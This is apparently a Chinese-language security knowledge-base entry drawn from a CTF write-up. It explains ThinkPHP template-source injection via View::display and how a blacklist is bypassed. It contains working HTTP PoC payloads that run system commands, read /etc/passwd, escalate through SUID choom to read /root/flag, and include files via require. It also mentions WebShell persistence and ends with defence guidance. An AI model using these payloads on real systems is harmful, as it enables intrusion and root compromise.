---
id: web-php-framework-thinkphp-view-display-template-source-injection
title: ThinkPHP View::display 模板源拼接注入：{$Request.get.f|$Request.get.c} 绕过黑名单执行 system
type: scenario
domain: web
path: web/php/framework
technique: thinkphp-view-display-template-source-injection
tags:
- php
- thinkphp
- template-injection
- rce
- blacklist-bypass
- view-display
- suid
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:32+08:00'
  notes: 已对照原文核对：View::display 拼接模板源、{$Request.get.f|$Request.get.c} 过滤器调用、黑名单绕过与 choom SUID 提权链均一致；另含 require 文件包含入口；PoC 未在本机执行。
url: /docs/web/php/framework/web-php-framework-thinkphp-view-display-template-source-injection/
draft: false
kb_aliases:
- ThinkPHP View::display 注入
- 模板源拼接 RCE
- Request.get.f 过滤器调用
- ThinkPHP 模板注入
- renderme
---

## 一句话结论

当 ThinkPHP 控制器把用户输入直接拼进 `View::display("Hello, " . $name)` 的模板**源字符串**时，`$name` 中的 `{$Request.get.f|$Request.get.c}` 会被模板引擎编译成“用请求参数 `c` 作为函数名、`f` 作为参数”的调用；由于黑名单只检查 `$name` 本身，函数名与命令放在 `c`/`f` 参数里即可绕过，传入 `c=system&f=ls /` 即命令执行。

## 原理

- **错误的拼接位置**：`View::display($template)` 既可以接收模板文件名，也可以接收模板内容；这里把 `"Hello, " . $name` 直接作为模板源传入，等于让用户输入参与模板编译，而不是作为变量值渲染。
- **ThinkPHP 模板标签**：`{$Request.get.f|$Request.get.c}` 中 `$Request.get.f` 取 GET 参数 `f` 的值，`|$Request.get.c` 把 GET 参数 `c` 的值作为“过滤器/函数”应用到该值上；模板编译后等价于 `$c($f)`（或 `call_user_func` 形式），从而调用任意函数。
- **黑名单绕过**：`$name` 中只出现 `{$Request.get.f|$Request.get.c}`，不含 `system|exec|...`、括号、引号、反引号；真正的 `system` 和命令分别藏在 `c`、`f` 参数中，正则扫描 `$name` 时看不到。
- **执行位置**：模板编译/渲染发生在 PHP 进程内，函数调用以 Web 进程权限执行；若模板缓存目录可写，还可能落地编译后的 PHP 文件。
- **后续提权**：文章在容器内发现 SUID `choom`，用 `choom -n 0 /bin/cat /root/flag` 以 root 读取 flag；这是独立的环境问题，但也说明 Web RCE 后应继续枚举 SUID。
- **前提**：ThinkPHP 版本/模板引擎支持 `{$var|func}` 过滤器语法；应用未关闭模板函数调用；`View::display` 的字符串被当作模板内容。

## 触发条件

- ThinkPHP 应用存在 `View::display("..." . $userInput)` 或类似把用户输入拼入模板源的写法。
- 黑名单只扫描拼入的变量，未扫描其它请求参数，也未禁用模板函数/过滤器调用。
- 模板引擎允许 `{$Request.get.x|$Request.get.y}` 这类动态函数调用。
- Web 进程有命令执行权限；若需读 root flag，还需 SUID/提权条件。

## 利用步骤

1. 探测模板注入：请求 `?name={$Request.get.f|$Request.get.c}&c=phpinfo&f=1`，观察是否执行 `phpinfo(1)` 或报错暴露模板编译。
2. 执行命令：`?name={$Request.get.f|$Request.get.c}&c=system&f=id`。
3. 读取文件/列目录：`c=system&f=ls /`、`c=system&f=cat /etc/passwd`。
4. 若根目录无 flag，枚举 SUID：`find / -perm -4000 -type f 2>/dev/null`。
5. 利用 SUID `choom` 以 root 执行命令：`c=system&f=choom -n 0 /bin/cat /root/flag`（`choom` 可调整 OOM 分数，配合 `-n 0` 执行任意程序）。
6. 授权测试只用 `id`/`ls` 等无害命令。

## PoC

```http
GET /?name={$Request.get.f|$Request.get.c}&c=system&f=id HTTP/1.1
Host: target
```

```http
GET /?name={$Request.get.f|$Request.get.c}&c=system&f=choom%20-n%200%20/bin/cat%20/root/flag HTTP/1.1
Host: target
```

文章还展示了另一条更直接的文件包含/RCE 入口：`/?name=<?=$n=$_REQUEST[1];require$n;?>&1=/etc/passwd`；说明该应用对 `$name` 的过滤整体不足，`View::display` 只是其中一条链。

## 变体与关联

- 变体：`{:system('id')}`、`{$Request.get.a|system}`、`{if condition="..."}` 等标签，取决于黑名单与模板引擎版本。
- 变体：若 `View::display` 只接受模板名，可尝试模板路径穿越/缓存文件写入；若使用 `View::assign` 则普通变量输出不一定执行。
- 变体：RCE 后结合 SUID（`choom`、`mount`、`chfn` 等）或容器配置提权；也可写 WebShell 持久化。
- 关联：[[web-php-framework-thinkphp-5x-invokefunction-captcha-rce]]（ThinkPHP 5.x invokefunction RCE）、[[web-php-rce-foxcms-taglib-id-code-injection]]（模板标签拼接代码注入）、[[web-php-rce-eval-getallheaders-no-param-function-call]]（动态函数调用导致命令执行）。

## 检测与防御

- 防御：禁止把用户输入拼进 `View::display`/模板源；使用 `View::assign` 传变量并固定模板文件；关闭模板引擎的动态函数调用/过滤器，或使用白名单。
- 防御：黑名单不能只扫描单个变量；对模板编译输入做整体校验，拒绝 `{`、`}`、`$`、`|` 等模板语法字符。
- 检测：请求参数中出现 `{$Request`、`|`、`system`、`choom`、模板标签；模板缓存目录出现异常编译文件；Web 进程派生的异常子进程。
- 响应：隔离 Web 容器，轮换凭据，检查模板缓存与 WebShell，修复模板拼接点并升级 ThinkPHP。
